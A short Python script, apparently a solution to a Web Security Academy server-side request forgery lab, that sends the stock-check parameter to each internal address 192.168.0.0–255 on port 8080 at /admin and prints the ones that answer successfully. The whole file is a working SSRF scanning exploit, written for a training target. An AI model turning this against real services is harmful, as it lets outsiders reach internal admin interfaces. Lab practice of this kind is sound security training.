import requests

url = """https://0abe00b504f5d7a6828993d6005f006f.web-security-academy.net/product/stock"""

for i in range(256):
    payload = {"stockApi":f"http://192.168.0.{i}:8080/admin?productId=2&storeId=3"}
    r = requests.post(url, data=payload)
    if r.status_code == 200:
        print(i)